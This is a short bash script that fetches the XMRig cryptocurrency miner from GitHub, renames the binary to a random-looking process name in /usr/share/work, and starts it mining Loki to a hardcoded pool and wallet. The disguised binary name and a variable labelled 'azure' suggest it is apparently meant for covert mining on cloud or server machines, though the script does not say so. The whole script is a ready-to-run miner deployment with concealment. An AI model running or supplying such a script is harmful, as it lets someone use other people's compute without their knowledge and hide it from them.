#!/bin/bash
sudo apt-get update
VERSION=5.11.1
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-$VERSION
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
POOL=loki.herominers.com:10114
USERNAME=LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV
ALGO=rx/loki
DONATE=1
./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME -p metan -a $ALGO -k --tls
